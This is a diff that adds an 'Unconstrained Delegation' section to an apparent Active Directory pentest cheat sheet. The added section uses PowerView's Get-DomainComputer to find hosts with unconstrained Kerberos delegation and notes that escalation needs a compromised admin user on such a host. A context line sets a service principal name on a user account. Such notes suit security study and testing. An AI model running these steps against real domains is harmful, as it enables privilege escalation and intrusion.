@@ -74,3 +74,13 @@ C:> Set-DomainObject -Identity support1user | Set @{serviceprincipalname='ops/wh
 ```
 
 ### Kerberos Delegation
+
+#### Uncostrained Delegation
+```powershell
+# Find Server with Unconstraided Delegation Enabled
+C:> . C:\AD\Tools\PowerView.ps1
+C:> Get-DomainComputer -Unconstrained | select -ExpandProperty name
+<host1>
+<host_n>
+```
+- Requisite for elevation using this technique, is to compromise a user with Admin Rights on the host
